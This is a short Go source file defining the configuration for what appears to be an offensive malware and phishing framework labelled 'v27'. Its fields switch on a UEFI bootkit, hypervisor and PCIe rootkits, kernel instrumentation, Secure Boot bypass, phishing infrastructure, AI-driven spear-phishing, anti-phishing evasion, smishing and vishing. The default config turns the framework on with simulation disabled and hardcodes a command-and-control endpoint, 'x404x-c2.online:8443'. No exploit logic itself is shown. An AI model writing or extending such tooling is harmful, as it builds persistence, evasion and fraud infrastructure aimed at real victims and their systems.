package v27

type V27Config struct {
	Enabled          bool   `json:"enabled"`
	Simulation       bool   `json:"simulation"`
	UEFIBootkit      bool   `json:"uefi_bootkit"`
	HypervisorRing   bool   `json:"hypervisor_ring"`
	PCIeRootkit      bool   `json:"pcie_rootkit"`
	KernelInstrument bool   `json:"kernel_instrument"`
	SecureBootBypass bool   `json:"secure_boot_bypass"`
	PhishingInfra    bool   `json:"phishing_infra"`
	SpearPhishAI     bool   `json:"spear_phish_ai"`
	AntiPhishEvasion bool   `json:"anti_phish_evasion"`
	SmishingSMS      bool   `json:"smishing_sms"`
	VishingVoice     bool   `json:"vishing_voice"`
	C2Endpoint       string `json:"c2_endpoint"`
}

func DefaultV27Config() *V27Config {
	return &V27Config{Enabled: true, Simulation: false, C2Endpoint: "x404x-c2.online:8443"}
}
